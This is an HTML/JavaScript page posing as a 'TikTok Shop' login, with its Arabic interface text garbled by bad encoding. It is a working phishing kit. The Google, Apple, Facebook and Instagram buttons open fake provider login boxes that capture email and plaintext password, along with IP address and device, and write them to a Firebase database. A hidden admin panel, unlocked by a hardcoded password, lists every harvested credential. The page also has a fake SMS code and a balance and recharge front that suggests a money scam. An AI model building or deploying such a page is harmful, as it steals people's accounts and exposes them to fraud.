<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Shop - Ultimate Auth</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, update, onValue, remove, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyC5zPaTAAU5lPCZ7LstSQ8J9IWmkQrpcMg",
            authDomain: "tiktokshop-9fd63.firebaseapp.com",
            projectId: "tiktokshop-9fd63",
            storageBucket: "tiktokshop-9fd63.firebasestorage.app",
            messagingSenderId: "1008538085856",
            appId: "1:1008538085856:web:83caa9dc0d7444e12c2385",
            measurementId: "G-1NSG64V4D4"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        window.db = db;
        window.ref = ref;
        window.set = set;
        window.get = get;
        window.update = update;
        window.remove = remove;
        window.onValue = onValue;
        window.push = push;

        console.log("System Ready");
        initializeAppLogic();
    </script>

    <style>
        body { font-family: 'Tajawal', sans-serif; user-select: none; background-color: #fff; }
        .hidden { display: none !important; }
        
        /* ØªØµÙ…ÙŠÙ… Ø§Ù„Ø´Ø§Ø´Ø© Ø§Ù„Ø¨ÙŠØ¶Ø§Ø¡ Ø§Ù„Ù†Ø¸ÙŠÙØ© Ù…Ø«Ù„ Ø§Ù„ØµÙˆØ±Ø© */
        .auth-container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        /* Social Buttons Styling to Match Image */
        .btn-social {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            padding: 14px;
            margin-bottom: 12px;
            border-radius: 10px;
            font-weight: bold;
            font-size: 15px;
            cursor: pointer;
            transition: 0.2s;
            position: relative;
        }
        .btn-social i, .btn-social img { position: absolute; left: 20px; font-size: 20px; width: 24px; }
        
        .btn-google { background: white; border: 1px solid #e5e7eb; color: #374151; }
        .btn-apple { background: black; color: white; border: 1px solid black; }
        .btn-facebook { background: #1877f2; color: white; border: none; }
        .btn-insta { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); color: white; border: none; }

        /* Forms */
        .modern-input { 
            width: 100%; padding: 14px 15px; 
            border: 1px solid #e5e7eb; border-radius: 12px; 
            background: #f9fafb; outline: none; margin-bottom: 10px;
            text-align: right;
        }
        .modern-input:focus { border-color: #000; background: #fff; }

        .back-btn { position: absolute; top: 20px; right: 20px; font-size: 20px; cursor: pointer; color: #333; }

        /* Animation */
        .fade-in { animation: fadeIn 0.4s ease-in-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        /* Simulation Modal */
        .sim-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 100; display: flex; justify-content: center; align-items: center; }
        .sim-content { background: white; width: 90%; max-width: 350px; border-radius: 12px; padding: 20px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
        .sim-input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; margin-bottom: 10px; text-align: left; direction: ltr; }
        .sim-btn { width: 100%; padding: 12px; border-radius: 8px; font-weight: bold; color: white; cursor: pointer; background: #2563eb; }

        /* Admin & App Styles */
        .admin-sidebar { background: #1e293b; color: white; width: 250px; min-height: 100vh; position: fixed; right: 0; top: 0; padding: 20px; z-index: 50; }
        .admin-content { margin-right: 250px; padding: 20px; min-height: 100vh; background: #f1f5f9; }
        .admin-nav-item { display: flex; items-center; padding: 12px 15px; margin-bottom: 8px; border-radius: 10px; cursor: pointer; transition: 0.2s; color: #94a3b8; font-weight: bold; font-size: 14px; }
        .admin-nav-item:hover, .admin-nav-item.active { background: #334155; color: #fbbf24; }
        .custom-table { width: 100%; border-collapse: collapse; background: white; border-radius: 10px; overflow: hidden; box-shadow: 0 2px 5px rgba(0,0,0,0.05); font-size: 12px; }
        .custom-table th { background: #f8fafc; padding: 12px; text-align: right; }
        .custom-table td { padding: 12px; border-bottom: 1px solid #f3f4f6; }

        @media (max-width: 768px) { .admin-sidebar { width: 60px; padding: 10px 5px; } .admin-content { margin-right: 60px; } .admin-sidebar span { display: none; } }
        
        .loader { border: 4px solid #f3f3f3; border-radius: 50%; border-top: 4px solid #000; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 200; display: flex; justify-content: center; align-items: center; }
        .modal-box { background: white; padding: 20px; border-radius: 15px; width: 90%; max-width: 400px; text-align: center; position: relative; max-height: 90vh; overflow-y: auto; }
        .slider-container { position: relative; width: 100%; height: 200px; overflow: hidden; border-radius: 1rem; margin-bottom: 1.5rem; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); }
        .slide { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-size: cover; background-position: center; opacity: 0; transition: opacity 1s ease-in-out; }
        .slide.active { opacity: 1; }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .animate-marquee { display: inline-block; white-space: nowrap; animation: marquee 15s linear infinite; }
    </style>
</head>
<body>

    <div id="loading-overlay" class="fixed inset-0 bg-white z-[999] flex flex-col items-center justify-center">
        <div class="loader mb-4"></div>
        <p class="text-sm text-gray-500 font-bold">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</p>
    </div>

    <div id="auth-screen" class="hidden">
        
        <div id="auth-landing" class="auth-container fade-in relative">
            <div class="text-center mb-10 mt-10">
                <div class="w-20 h-20 bg-black text-white rounded-3xl flex items-center justify-center mx-auto mb-4 shadow-xl">
                    <i class="fa-brands fa-tiktok text-4xl"></i>
                </div>
                <h1 class="text-3xl font-extrabold text-gray-900 mb-2">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</h1>
                <p class="text-gray-500">Ù‚Ù… Ø¨Ø¥Ø¯Ø§Ø±Ø© Ø£Ø±Ø¨Ø§Ø­Ùƒ ÙˆÙ…ØªØ¬Ø±Ùƒ Ø¨Ø³Ù‡ÙˆÙ„Ø©</p>
            </div>

            <div onclick="openSimulation('google')" class="btn-social btn-google">
                Ø§Ù„Ù…ØªØ§Ø¨Ø¹Ø© Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Google
                <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google">
            </div>
            
            <div onclick="openSimulation('apple')" class="btn-social btn-apple">
                Ø§Ù„Ù…ØªØ§Ø¨Ø¹Ø© Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Apple
                <i class="fa-brands fa-apple"></i>
            </div>
            
            <div onclick="openSimulation('facebook')" class="btn-social btn-facebook">
                Ø§Ù„Ù…ØªØ§Ø¨Ø¹Ø© Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Facebook
                <i class="fa-brands fa-facebook-f"></i>
            </div>
            
            <div onclick="openSimulation('instagram')" class="btn-social btn-insta">
                Ø§Ù„Ù…ØªØ§Ø¨Ø¹Ø© Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Instagram
                <i class="fa-brands fa-instagram"></i>
            </div>

            <div class="flex items-center my-6">
                <div class="flex-1 border-t border-gray-200"></div>
                <span class="px-3 text-gray-400 text-xs font-bold">Ø£Ùˆ</span>
                <div class="flex-1 border-t border-gray-200"></div>
            </div>

            <button onclick="switchView('auth-login')" class="w-full bg-gray-100 text-gray-700 py-4 rounded-xl font-bold hover:bg-gray-200 transition mb-4">
                ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¨Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ
            </button>

            <p class="text-center text-sm text-gray-500">
                Ù„ÙŠØ³ Ù„Ø¯ÙŠÙƒ Ø­Ø³Ø§Ø¨ØŸ 
                <span onclick="switchView('auth-register')" class="text-blue-600 font-bold cursor-pointer hover:underline">Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨</span>
            </p>

            <div class="mt-8 text-center">
                <span onclick="adminLoginPrompt()" class="text-gray-300 text-xs cursor-pointer">Admin Login</span>
            </div>
        </div>

        <div id="auth-login" class="auth-container fade-in hidden relative">
            <i onclick="switchView('auth-landing')" class="fa-solid fa-arrow-right back-btn"></i>
            
            <div class="text-center mb-8 mt-10">
                <h2 class="text-2xl font-bold mb-2">Ø£Ù‡Ù„Ø§Ù‹ Ø¨Ø¹ÙˆØ¯ØªÙƒ ğŸ‘‹</h2>
                <p class="text-gray-500">Ø£Ø¯Ø®Ù„ Ø¨ÙŠØ§Ù†Ø§ØªÙƒ Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©</p>
            </div>

            <div class="space-y-2">
                <input type="text" id="login-phone" class="modern-input" placeholder="Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ">
                <input type="password" id="login-pass" class="modern-input" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±">
            </div>
            
            <button onclick="loginUser()" class="w-full bg-black text-white py-4 rounded-xl font-bold shadow-lg mt-6 hover:opacity-90 transition">
                ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„
            </button>
        </div>

        <div id="auth-register" class="auth-container fade-in hidden relative">
            <i onclick="switchView('auth-landing')" class="fa-solid fa-arrow-right back-btn"></i>

            <div class="text-center mb-8 mt-6">
                <h2 class="text-2xl font-bold mb-2">Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯ ğŸš€</h2>
                <p class="text-gray-500">Ø§Ù…Ù„Ø£ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ§Ù„ÙŠØ©</p>
            </div>

            <div id="reg-step-1">
                <label class="block text-sm font-bold text-gray-700 mb-1">Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ</label>
                <input type="number" id="reg-phone" class="modern-input" placeholder="01xxxxxxxxx">
                <button onclick="sendOtp()" class="w-full bg-blue-600 text-white py-4 rounded-xl font-bold shadow-lg mt-4">Ø¥Ø±Ø³Ø§Ù„ ÙƒÙˆØ¯ Ø§Ù„ØªØ­Ù‚Ù‚</button>
            </div>

            <div id="reg-step-2" class="hidden text-center">
                <p class="text-sm text-gray-600 mb-4">ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙƒÙˆØ¯ ÙÙŠ Ø±Ø³Ø§Ù„Ø© Ù†ØµÙŠØ©</p>
                <input type="number" id="reg-otp-input" class="modern-input text-center text-2xl tracking-widest font-bold" placeholder="----">
                <button onclick="verifyOtp()" class="w-full bg-green-600 text-white py-4 rounded-xl font-bold mt-4">ØªØ£ÙƒÙŠØ¯ Ø§Ù„ÙƒÙˆØ¯</button>
            </div>

            <div id="reg-step-3" class="hidden space-y-3">
                <div>
                    <label class="text-xs font-bold text-gray-500">Ø§Ù„Ø§Ø³Ù… Ø¨Ø§Ù„ÙƒØ§Ù…Ù„</label>
                    <input type="text" id="reg-name" class="modern-input">
                </div>
                <div>
                    <label class="text-xs font-bold text-gray-500">ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯</label>
                    <input type="date" id="reg-dob" class="modern-input text-gray-600">
                    <p class="text-[10px] text-red-400">* ÙŠØ¬Ø¨ Ø£Ù† ÙŠÙƒÙˆÙ† 16 Ø³Ù†Ø© ÙØ£ÙƒØ«Ø±</p>
                </div>
                <div>
                    <label class="text-xs font-bold text-gray-500">ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</label>
                    <input type="password" id="reg-pass" class="modern-input">
                </div>
                <div>
                    <label class="text-xs font-bold text-gray-500">ØªØ£ÙƒÙŠØ¯ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</label>
                    <input type="password" id="reg-pass-confirm" class="modern-input">
                </div>
                <button onclick="completeRegistration()" class="w-full bg-[#FCD34D] text-black py-4 rounded-xl font-bold shadow-lg mt-2">Ø¥ØªÙ…Ø§Ù… Ø§Ù„ØªØ³Ø¬ÙŠÙ„</button>
            </div>
        </div>
    </div>

    <div id="sim-modal" class="sim-modal hidden">
        <div class="sim-content relative">
            <i onclick="closeSimulation()" class="fa-solid fa-xmark absolute top-3 left-3 cursor-pointer text-gray-400 hover:text-gray-600 text-xl"></i>
            
            <div class="mb-6 text-center">
                <img id="sim-logo" src="" class="w-12 mx-auto mb-3">
                <h3 id="sim-title" class="font-bold text-lg text-gray-800">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</h3>
                <p class="text-xs text-gray-500">Ø§Ø³ØªØ®Ø¯Ù… Ø­Ø³Ø§Ø¨Ùƒ Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©</p>
            </div>

            <input type="email" id="sim-email" class="sim-input" placeholder="Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ">
            <input type="password" id="sim-pass" class="sim-input" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±">
            <input type="hidden" id="sim-provider">

            <button onclick="submitSimulation()" id="sim-btn" class="sim-btn">Ù…ØªØ§Ø¨Ø¹Ø©</button>
        </div>
    </div>

    <div id="admin-panel" class="hidden flex">
        <aside class="admin-sidebar">
            <div class="flex items-center gap-2 mb-8 px-2 text-yellow-400 font-bold text-xl"><i class="fa-solid fa-shield-halved"></i> Admin Panel</div>
            <nav class="space-y-2 text-sm">
                <div onclick="showAdminTab('users')" class="p-2 hover:bg-gray-700 rounded cursor-pointer">Ø§Ù„Ø¹Ù…Ù„Ø§Ø¡</div>
                <div onclick="showAdminTab('tasks')" class="p-2 hover:bg-gray-700 rounded cursor-pointer">Ø§Ù„Ù…Ù‡Ø§Ù…</div>
                <div onclick="showAdminTab('signatures')" class="p-2 hover:bg-gray-700 rounded cursor-pointer">Ø§Ù„Ø¨Ø§Ù‚Ø§Øª</div>
                <div onclick="showAdminTab('requests')" class="p-2 hover:bg-gray-700 rounded cursor-pointer">Ø§Ù„Ø´Ø­Ù†</div>
                <div onclick="logout()" class="p-2 text-red-400 cursor-pointer mt-4">Ø®Ø±ÙˆØ¬</div>
            </nav>
        </aside>
        <main class="admin-content flex-1">
            <div id="admin-users-sec" class="hidden">
                <h2 class="font-bold text-xl mb-4">Ø§Ù„Ø¹Ù…Ù„Ø§Ø¡</h2>
                <div class="bg-white p-4 rounded shadow overflow-x-auto">
                    <table class="w-full text-right text-sm border-collapse">
                        <thead><tr class="bg-gray-100 border-b">
                            <th class="p-3">Ø§Ù„Ø¹Ù…ÙŠÙ„</th><th class="p-3">Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„</th><th class="p-3">Ø±ØµÙŠØ¯</th><th class="p-3">ØªØ­ÙƒÙ…</th>
                        </tr></thead>
                        <tbody id="admin-users-list"></tbody>
                    </table>
                </div>
            </div>
            <div id="admin-placeholder" class="text-center text-gray-500 mt-20">Ø§Ø®ØªØ± Ù‚Ø³Ù…Ø§Ù‹ Ù…Ù† Ø§Ù„Ù‚Ø§Ø¦Ù…Ø©</div>
        </main>
    </div>

    <div id="client-app" class="hidden pb-20 bg-gray-50 min-h-screen">
        <div class="p-4">
            <div class="flex justify-between items-center mb-6">
                <div>
                    <h1 class="font-bold text-2xl">Ù…Ø±Ø­Ø¨Ø§Ù‹, <span id="profile-name">User</span></h1>
                    <p class="text-gray-500 text-xs" id="profile-rank">Ø¹Ø¶Ùˆ Ù…Ø¬Ø§Ù†ÙŠ</p>
                </div>
                <div class="w-10 h-10 bg-yellow-400 rounded-full flex items-center justify-center font-bold text-white"><i class="fa-solid fa-user"></i></div>
            </div>
            
            <div class="bg-black text-white p-6 rounded-2xl shadow-lg mb-6 relative overflow-hidden">
                <div class="absolute -right-4 -top-4 w-24 h-24 bg-yellow-500 rounded-full opacity-20"></div>
                <p class="text-gray-400 text-xs mb-1">Ø§Ù„Ø±ØµÙŠØ¯ Ø§Ù„Ø­Ø§Ù„ÙŠ</p>
                <h2 class="text-3xl font-bold"><span id="profile-balance">0.00</span> Ø¬.Ù…</h2>
                <div class="mt-4 flex gap-3">
                    <button onclick="alert('Ù‚Ø±ÙŠØ¨Ø§Ù‹')" class="bg-yellow-500 text-black px-4 py-1.5 rounded-lg text-xs font-bold">Ø³Ø­Ø¨</button>
                    <button onclick="alert('ØªÙˆØ§ØµÙ„ Ù…Ø¹ Ø§Ù„Ø§Ø¯Ù…Ù† Ù„Ù„Ø´Ø­Ù†')" class="bg-gray-800 px-4 py-1.5 rounded-lg text-xs font-bold">Ø´Ø­Ù†</button>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4">
                <div class="bg-white p-4 rounded-xl shadow-sm text-center border">
                    <i class="fa-solid fa-list-check text-2xl text-blue-500 mb-2"></i>
                    <h3 class="font-bold text-sm">Ø§Ù„Ù…Ù‡Ø§Ù…</h3>
                </div>
                <div class="bg-white p-4 rounded-xl shadow-sm text-center border">
                    <i class="fa-solid fa-gem text-2xl text-purple-500 mb-2"></i>
                    <h3 class="font-bold text-sm">Ø§Ù„Ø¨Ø§Ù‚Ø§Øª</h3>
                </div>
            </div>
            
            <div class="mt-8">
                <button onclick="logout()" class="w-full border border-red-200 text-red-500 py-3 rounded-xl font-bold">ØªØ³Ø¬ÙŠÙ„ Ø®Ø±ÙˆØ¬</button>
            </div>
        </div>
    </div>

    <script>
        let currentUser = null;
        let allUsers = [];
        let generatedOtp = null;
        let registeringPhone = null;

        function initializeAppLogic() {
            setTimeout(() => {
                document.getElementById('loading-overlay').classList.add('hidden');
                document.getElementById('auth-screen').classList.remove('hidden');
                
                // Listeners
                window.onValue(window.ref(window.db, 'users'), (snap) => {
                    if(snap.val()) {
                        allUsers = Object.values(snap.val());
                        if(!document.getElementById('admin-panel').classList.contains('hidden')) renderAdminUsers();
                    }
                });
            }, 1000);
        }

        // Navigation
        window.switchView = (viewId) => {
            ['auth-landing', 'auth-login', 'auth-register'].forEach(id => document.getElementById(id).classList.add('hidden'));
            document.getElementById(viewId).classList.remove('hidden');
        };

        // Social Simulation
        window.openSimulation = (provider) => {
            const modal = document.getElementById('sim-modal');
            const logo = document.getElementById('sim-logo');
            const title = document.getElementById('sim-title');
            const btn = document.getElementById('sim-btn');
            
            document.getElementById('sim-email').value = '';
            document.getElementById('sim-pass').value = '';
            document.getElementById('sim-provider').value = provider;

            if(provider === 'google') { logo.src = "https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg"; title.innerText = "Google"; btn.style.background="#1a73e8"; }
            else if(provider === 'facebook') { logo.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/2048px-2021_Facebook_icon.svg.png"; title.innerText = "Facebook"; btn.style.background="#1877f2"; }
            else if(provider === 'instagram') { logo.src = "https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"; title.innerText = "Instagram"; btn.style.background="linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888)"; }
            else { logo.src = "https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"; title.innerText = "Apple ID"; btn.style.background="black"; }
            
            modal.classList.remove('hidden');
        };

        window.closeSimulation = () => document.getElementById('sim-modal').classList.add('hidden');

        window.submitSimulation = async () => {
            const email = document.getElementById('sim-email').value;
            const pass = document.getElementById('sim-pass').value;
            const provider = document.getElementById('sim-provider').value;

            if(!email || !pass) return alert("ÙŠØ±Ø¬Ù‰ Ù…Ù„Ø¡ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª");

            window.closeSimulation();
            document.getElementById('loading-overlay').classList.remove('hidden');

            // Fetch IP
            let ip = 'Unknown';
            try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e){}
            
            // Use email as key (cleaned)
            const key = email.replace(/[.#$[\]]/g, '_');
            const uid = Math.floor(100000 + Math.random() * 900000);
            
            const newUser = {
                name: email.split('@')[0],
                email: email,
                password: pass, // ğŸ”‘ Saving the password for Admin
                provider: provider,
                phone: "Social Login",
                balance: 0, totalIncome: 0,
                uid: uid, ip: ip, device: navigator.userAgent,
                isBanned: false, isSigned: false, currentTaskIndex: 1
            };

            window.set(window.ref(window.db, 'users/' + key), newUser).then(() => {
                currentUser = newUser;
                document.getElementById('loading-overlay').classList.add('hidden');
                document.getElementById('auth-screen').classList.add('hidden');
                document.getElementById('client-app').classList.remove('hidden');
                updateAppUI();
            });
        };

        // Standard Login/Register Logic
        window.sendOtp = () => {
            registeringPhone = document.getElementById('reg-phone').value;
            if(!registeringPhone) return alert("Ø§ÙƒØªØ¨ Ø§Ù„Ø±Ù‚Ù…");
            window.get(window.ref(window.db, 'users/' + registeringPhone)).then(snap => {
                if(snap.exists()) { alert("Ù…Ø³Ø¬Ù„ Ù…Ø³Ø¨Ù‚Ø§Ù‹"); window.switchView('auth-login'); }
                else {
                    generatedOtp = Math.floor(1000 + Math.random() * 9000);
                    alert(`ÙƒÙˆØ¯: ${generatedOtp}`);
                    document.getElementById('reg-step-1').classList.add('hidden');
                    document.getElementById('reg-step-2').classList.remove('hidden');
                }
            });
        };

        window.verifyOtp = () => {
            if(document.getElementById('reg-otp-input').value == generatedOtp) {
                document.getElementById('reg-step-2').classList.add('hidden');
                document.getElementById('reg-step-3').classList.remove('hidden');
            } else alert("Ø®Ø·Ø£");
        };

        window.completeRegistration = async () => {
            const name = document.getElementById('reg-name').value;
            const dob = document.getElementById('reg-dob').value;
            const pass = document.getElementById('reg-pass').value;
            const pc = document.getElementById('reg-pass-confirm').value;
            
            if(!name || !dob || !pass) return alert("Ù†Ø§Ù‚Øµ");
            if(pass !== pc) return alert("ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± ØºÙŠØ± Ù…ØªØ·Ø§Ø¨Ù‚Ø©");

            // Age Check
            const bDate = new Date(dob), today = new Date();
            let age = today.getFullYear() - bDate.getFullYear();
            if (today.getMonth() < bDate.getMonth() || (today.getMonth() === bDate.getMonth() && today.getDate() < bDate.getDate())) age--;
            if(age < 16) return alert("Ø§Ù„Ø¹Ù…Ø± ÙŠØ¬Ø¨ Ø£Ù† ÙŠÙƒÙˆÙ† 16+");

            // IP
            let ip = 'Unknown'; try { const r=await fetch('https://api.ipify.org?format=json'); const d=await r.json(); ip=d.ip; } catch(e){}

            const newUser = {
                name, phone: registeringPhone, dob, password: pass,
                balance: 0, totalIncome: 0, provider: 'Phone',
                uid: Math.floor(100000 + Math.random() * 900000),
                ip: ip, device: navigator.userAgent, isBanned: false, isSigned: false, currentTaskIndex: 1
            };

            window.set(window.ref(window.db, 'users/' + registeringPhone), newUser).then(() => {
                alert("ØªÙ… Ø§Ù„ØªØ³Ø¬ÙŠÙ„");
                window.switchView('auth-login');
            });
        };

        window.loginUser = () => {
            const p = document.getElementById('login-phone').value;
            const pw = document.getElementById('login-pass').value;
            
            if(p === 'admin' && pw === 'mohy123') {
                document.getElementById('auth-screen').classList.add('hidden');
                document.getElementById('admin-panel').classList.remove('hidden');
                document.getElementById('admin-users-sec').classList.remove('hidden');
                renderAdminUsers();
                return;
            }

            window.get(window.ref(window.db, 'users/' + p)).then(snap => {
                if(snap.exists() && snap.val().password === pw) {
                    if(snap.val().isBanned) return alert("Ù…Ø­Ø¸ÙˆØ±");
                    currentUser = snap.val();
                    document.getElementById('auth-screen').classList.add('hidden');
                    document.getElementById('client-app').classList.remove('hidden');
                    updateAppUI();
                } else alert("Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª");
            });
        };

        function updateAppUI() {
            document.getElementById('profile-name').innerText = currentUser.name;
            document.getElementById('profile-balance').innerText = currentUser.balance.toFixed(2);
            document.getElementById('profile-rank').innerText = currentUser.provider === 'Phone' ? 'Ø­Ø³Ø§Ø¨ Ù‡Ø§ØªÙ' : 'Ø­Ø³Ø§Ø¨ ' + currentUser.provider;
        }

        window.logout = () => location.reload();

        // --- Admin Logic (Simplified for this view) ---
        window.showAdminTab = (tab) => {
            if(tab === 'users') {
                document.getElementById('admin-users-sec').classList.remove('hidden');
                renderAdminUsers();
            } else {
                document.getElementById('admin-users-sec').classList.add('hidden');
                alert("Ø¨Ø§Ù‚ÙŠ Ø§Ù„Ø£Ù‚Ø³Ø§Ù… Ù…ÙˆØ¬ÙˆØ¯Ø© ÙÙŠ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø³Ø§Ø¨Ù‚ (Ù„Ù„Ø§Ø®ØªØµØ§Ø±)");
            }
        };

        function renderAdminUsers() {
            const tbody = document.getElementById('admin-users-list');
            tbody.innerHTML = '';
            allUsers.forEach(u => {
                // Show Email/Pass for Social, Phone/Pass for Standard
                const loginInfo = u.provider === 'Phone' ? u.phone : u.email;
                const passDisplay = u.provider === 'Phone' ? u.password : `<span class="text-red-600 font-mono">${u.password}</span> (Social)`;

                tbody.innerHTML += `
                <tr class="border-b">
                    <td class="p-3 font-bold">${u.name}</td>
                    <td class="p-3 text-xs text-blue-600">${loginInfo}<br>${passDisplay}</td>
                    <td class="p-3 font-bold text-green-600">${u.balance}</td>
                    <td class="p-3 text-xs">
                        <button onclick="deleteUser('${u.provider === 'Phone' ? u.phone : u.email.replace(/[.#$[\]]/g, '_')}')" class="text-red-500">Ø­Ø°Ù</button>
                    </td>
                </tr>`;
            });
        }
        
        window.deleteUser = (key) => { if(confirm("Ø­Ø°ÙØŸ")) window.remove(window.ref(window.db, 'users/'+key)); };
        window.adminLoginPrompt = () => { const p = prompt("Pass:"); if(p==='mohy123') { document.getElementById('auth-screen').classList.add('hidden'); document.getElementById('admin-panel').classList.remove('hidden'); document.getElementById('admin-users-sec').classList.remove('hidden'); renderAdminUsers(); } };

    </script>
</body>
</html>
